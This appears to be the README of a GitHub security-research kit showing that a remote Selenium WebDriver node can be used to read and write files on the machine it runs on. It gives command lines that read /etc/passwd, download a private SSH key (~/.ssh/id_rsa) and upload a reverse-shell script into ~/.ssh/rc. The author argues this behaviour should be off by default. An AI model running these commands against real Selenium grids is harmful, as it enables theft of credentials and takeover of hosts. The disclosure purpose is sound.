# selenium-node-takeover-kit
These examples are to demonstrate possible issues with Selenium’s current design and configuration.

When a Selenium test interacts with a remote web driver, it can do the same things a user interacting with a local browser can do on the remote selenium node. Namely reading files off the remote node to the local tester
```bash
examples/selenium_node_cat.py -h http://selenium-hub.lan:4444/wd/hub -r /etc/passwd
examples/selenium_node_download.py -h http://selenium-hub.lan:4444/wd/hub -r ~/.ssh/id_rsa -l ./nodes_rsa
```

and writing files to the remote node from the local tester
```bash
examples/selenium_node_upload.py -h http://selenium-hub.lan:4444/wd/hub -r ~/.ssh/rc -l ./reverse_shell.sh
```
in the context of the running service. According to Selenium, this behavior is by design (see https://github.com/JonStratton/selenium-node-takeover-kit/issues/1) and that not exposing the testing hub to the internet and not storing secrets on the hub is sufficient. I believe these abilities are still dangerous and should be something that can be turned off, and turned off by default.
